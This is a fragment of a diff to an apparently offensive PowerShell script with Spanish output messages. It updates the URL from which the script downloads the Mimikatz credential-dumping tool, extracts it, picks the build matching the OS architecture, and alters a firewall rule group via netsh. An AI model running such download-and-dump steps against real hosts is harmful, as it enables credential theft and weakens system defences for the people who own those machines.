@@ -87,7 +87,7 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
         Write-Host ""
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
         Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
-	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip" -Outfile mimikatz.zip
+	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip" -Outfile mimikatz.zip
 	Expand-Archive .\mimikatz.zip -Force
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
